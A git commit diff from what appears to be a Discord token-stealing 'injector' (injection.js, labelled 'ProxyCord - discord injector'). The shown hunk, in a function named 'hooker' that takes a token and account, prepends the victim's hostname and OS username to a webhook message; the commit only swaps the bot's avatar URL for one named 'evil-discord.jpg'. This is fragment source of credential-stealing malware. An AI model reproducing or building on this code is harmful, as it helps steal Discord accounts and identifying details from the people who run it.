f53edb5b8a6ca6ecad2c9d461c73854afd2a2ebe
saeed0x1 <behesti4053@gmail.com>
2024-08-26 19:52:02 +0530

    updated

--- injection.js
+++ injection.js
@@ -148,7 +148,7 @@ const request = async (method, url, headers, data) => {
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "ProxyCord - discord injector";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["avatar_url"] = "https://i.ibb.co/kMbgGgC/evil-discord.jpg";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
